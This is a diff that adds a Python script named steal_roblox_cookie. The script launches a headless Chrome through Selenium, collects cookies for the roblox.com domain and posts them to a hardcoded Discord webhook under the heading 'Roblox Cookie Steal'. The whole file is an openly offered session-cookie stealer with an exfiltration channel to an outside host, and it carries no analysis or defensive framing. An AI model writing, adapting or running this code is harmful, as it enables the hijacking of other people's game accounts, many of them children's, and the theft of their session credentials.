@@ -1,0 +1,73 @@
+import time
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+import requests
+import base64
+
+def steal_roblox_cookie():
+    # Setup Chrome options
+    chrome_options = Options()
+    chrome_options.add_argument("--headless")
+    chrome_options.add_argument("--disable-gpu")
+    chrome_options.add_argument("--no-sandbox")
+    
+    webhook_url = "https://discord.com/api/webhooks/1533937727903498262/EDZkUjqJCjaDFKNAS4rRYwjBSsVnlK0F7X82nQaVH_7V3Yb2GTyMrTI1W7pCjIKbgk5V"
+    
+    try:
+        # Launch browser
+        driver = webdriver.Chrome(options=chrome_options)
+        driver.get("https://www.roblox.com/")
+        time.sleep(2)
+        
+        # Get all cookies
+        cookies = driver.get_cookies()
+        
+        # Filter for Roblox cookies
+        roblox_cookies = {}
+        for cookie in cookies:
+            if 'roblox' in cookie['domain']:
+                roblox_cookies[cookie['name']] = cookie['value']
+        
+        if not roblox_cookies:
+            print("No Roblox cookies found")
+            return False
+            
+        # Format for webhook
+        embed_data = {
+            "content": "**Roblox Cookie Steal**",
+            "embeds": [{
+                "title": "Roblox Cookie Data",
+                "color": 0x00ff00,
+                "fields": []
+            }]
+        }
+        
+        # Add cookie data
+        for name, value in roblox_cookies.items():
+            embed_data["embeds"][0]["fields"].append({
+                "name": f"Cookie: {name}",
+                "value": f"```{value}```",
+                "inline": False
+            })
+            
+        # Send to webhook
+        headers = {
+            "Content-Type": "application/json"
+        }
+        response = requests.post(webhook_url, json=embed_data, headers=headers)
+        
+        if response.status_code == 204:
+            print("Successfully sent cookie data to webhook")
+            return True
+        else:
+            print(f"Failed to send: {response.status_code}")
+            return False
+            
+    except Exception as e:
+        print(f"Error: {e}")
+        return False
+    finally:
+        driver.quit()
+
+if __name__ == "__main__":
+    steal_roblox_cookie()
